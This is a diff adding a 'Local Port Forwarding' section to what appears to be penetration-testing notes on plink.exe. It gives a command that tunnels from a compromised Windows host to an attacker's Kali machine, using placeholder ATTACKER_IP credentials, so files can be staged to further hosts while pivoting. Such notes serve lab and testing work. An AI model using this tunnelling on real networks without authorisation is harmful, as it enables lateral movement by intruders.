@@ -13,6 +13,19 @@ It has similar features to openSSH, but without remote dynamic port forwarding.
 If you are getting an error about algorithm choice when calling plink, consider getting a newer version from [here](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html).
 
 
+### Local Port Forwarding
+
+In the scenario where you have gained access to `SRV1` and you want to forward traffic from `SRV1` port 8000 to port 80 on your kali machine, you can do:
+
+```
+cmd.exe /c echo y | .\plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -L 8000:${ATTACKER_IP}:80 ${ATTACKER_IP} 
+```
+
+This way, if you later pivot to `SRV2` who cannot directly access your web server on your kali machine, you can call `${SRV1_IP}:${SRV1_PORT}` (port 8000 in this example),
+to transfer files to `SRV2`.
+
+### Remote Port Forwarding
+
 assuming we have `plink.exe` available on the windows host, we can do remote port forwarding with:
 
 ```
